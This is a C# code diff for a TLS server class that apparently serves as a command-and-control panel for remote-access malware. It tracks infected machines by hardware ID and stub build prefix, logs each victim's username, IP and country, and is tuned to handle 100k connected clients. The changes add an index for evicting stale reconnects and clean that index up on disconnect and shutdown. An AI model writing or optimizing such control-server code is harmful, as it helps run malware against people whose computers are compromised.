@@ -53,6 +53,8 @@ public class TlsServer
     private readonly ConcurrentDictionary<string, (int count, DateTime reset)> _connRate  = new();
     // Tracks consecutive auth failures per IP — temp-bans after 5 failures in 60s
     private readonly ConcurrentDictionary<string, (int fails, DateTime unbanAt)> _authFail = new();
+    // HWID+prefix → active client — O(1) stale-connection lookup on reconnect (replaces O(n) Values scan)
+    private readonly ConcurrentDictionary<string, ConnectedClient> _hwidToClient = new(StringComparer.OrdinalIgnoreCase);
 
     private const int MaxConnPerMinute  = 30;  // max new connections per IP per minute
     private const int MaxAuthFails      = 5;   // auth failures before 5-minute temp-ban
@@ -152,6 +154,7 @@ public class TlsServer
             try { client.Cts.Cancel(); client.Stream?.Close(); } catch { }
         }
         ConnectedClients.Clear();
+        _hwidToClient.Clear();
         Log("[*] Server stopped.");
     }
 
@@ -221,6 +224,8 @@ public class TlsServer
     {
         if (ConnectedClients.TryRemove(clientId, out var client))
         {
+            var pfx = client.Id.Contains('-') ? client.Id[..client.Id.IndexOf('-')] : "";
+            _hwidToClient.TryRemove(new KeyValuePair<string, ConnectedClient>(client.Hwid + ":" + pfx, client));
             try { client.Cts.Cancel(); client.Stream?.Dispose(); } catch { }
             if (_store.AllClients.TryGetValue(client.Hwid, out var rec))
             {
@@ -379,15 +384,14 @@ public class TlsServer
             // Evict an existing connection from the same HWID only when it's the same build
             // (same IdPrefix). Two stubs with different IdPrefixes running on the same machine
             // are independent programs and must coexist in the client list.
-            static string PrefixOf(string id) => id.Contains('-') ? id[..id.IndexOf('-')] : "";
-            string newPfx   = info.IdPrefix ?? "";
-            var stale = ConnectedClients.Values.FirstOrDefault(c =>
-                c.Hwid == client.Hwid &&
-                string.Equals(PrefixOf(c.Id), newPfx, StringComparison.Ordinal));
+            string newPfx = info.IdPrefix ?? "";
+            // O(1) stale lookup via HWID+prefix index — replaces O(n) ConnectedClients.Values scan
+            // that would cost O(100k) per reconnect at 100k connected clients.
+            var hwidKey = client.Hwid + ":" + newPfx;
+            ConnectedClient? stale = null;
+            if (_hwidToClient.TryGetValue(hwidKey, out var prev) && prev.Id != client.Id)
+                stale = prev;
 
-            // FIX: Add new client BEFORE disconnecting stale to avoid the race where the
-            // UI sees a ClientDisconnected event with no matching ClientConnected afterwards.
-            // Max clients check accounts for the fact that the stale slot is about to free up.
             int effectiveCount = ConnectedClients.Count - (stale != null ? 1 : 0);
             if (effectiveCount >= MaxConnectedClients)
             {
@@ -397,6 +401,7 @@ public class TlsServer
             }
 
             ConnectedClients[client.Id] = client;
+            _hwidToClient[hwidKey] = client;
             if (stale != null)
                 DisconnectClient(stale.Id);
             Log($"[+] Client {client.Id} connected ({info.Username}@{ip}, {client.Country})");
